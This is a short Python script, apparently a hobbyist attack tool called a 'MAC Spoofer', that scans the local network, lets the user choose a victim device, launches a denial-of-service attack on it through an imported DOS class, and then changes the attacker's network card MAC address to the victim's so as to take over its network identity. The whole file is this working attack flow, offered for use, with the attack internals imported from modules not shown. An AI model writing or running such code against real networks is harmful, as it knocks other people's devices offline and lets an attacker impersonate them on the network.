#!/usr/bin/env python3
"""
Nedded Utils:
    MacHandler
    Scanner
    DOS
"""
from src.all import *
from termcolor import colored
from tabulate import tabulate

def printClients(clients):
    data = []
    for i, client in enumerate(clients):
        if i == 0:
            continue
        data.append([i, client.ip, client.mac, client.name])
    print(tabulate(data, headers=["INDEX", "IP", "MAC", "NAME"], tablefmt="fancy_grid"))

def main():
    print("Welcome To My MAC Spoofer!")
    iface = input("Enter the name of your NIC >> ")
    input(colored("Enter To Scan The Network >> ", "magenta"))
    s = Scanner()
    s.scan()
    clients = s.getClients()
    print(colored(f"Found {len(clients)-1} clients!", "cyan", attrs=["bold"]))
    printClients(clients)
    while True:
        targetIndex = int(input("Enter The Index Of The Target >> "))
        if targetIndex > 0 and targetIndex < len(clients):
            break
        print(colored("Dude, Don't make it harder then it has to be", 'red', attrs=['bold']))
    target = clients[targetIndex]
    router = clients[0]
    print(f"Router >> {router.name}")
    print(f"Target >> {target.name}")
    dos = DOS(router, target)
    dos.start()
    print(colored(f"Running DOS against {target}.", "green", attrs=['bold']))
    print(colored(f"Changing MAC to <{target.mac}>...", 'magenta', attrs=['bold']))
    mh = MacHandler(iface)
    mh.changeMac(target.mac)
    print(colored("DONE!", "green", attrs=["bold"]))
    print(colored("GoodBye!", "red", attrs=['bold']))
    while not dos.stop:
        pass
    input("Enter To Restore >> ")
    mh.restoreMac()
    exit(0)

if __name__ == '__main__':
    main()